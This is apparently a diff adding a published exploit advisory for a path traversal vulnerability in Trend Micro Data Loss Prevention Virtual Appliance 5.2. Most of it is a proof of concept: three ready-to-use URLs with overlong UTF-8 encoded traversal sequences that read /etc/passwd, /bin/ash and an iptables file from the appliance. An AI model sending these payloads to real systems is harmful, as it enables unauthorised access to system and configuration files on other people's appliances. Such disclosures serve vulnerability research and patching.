@@ -1,0 +1,22 @@
+# Exploit Title: Trend Micro Data Loss Prevention Virtual Appliance 5.2 Web Path Traversal
+# Date: 10/11/2017
+# Exploit Author: Leonardo Duarte
+# Contact: http://twitter.com/etakdc
+# Vendor Homepage: http://la.trendmicro.com/la/productos/data-loss-prevention/
+# Version: 5.2
+# Tested on: Debian 9
+# Category: webapps
+
+1. Description
+   
+A path traversal vulnerability that can be exploited to read files outside of the web root using encoded dot and slash characters
+
+2. Proof of Concept
+ 
+https://ip:8443/dsc/%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFetc%C0%AFpasswd
+
+https://ip:8443/dsc/%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFbin%C0%AFash
+
+https://ip/dsc/%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AFhome%C0%AFdgate%C0%AFiptables
+
+Then the file will be visible
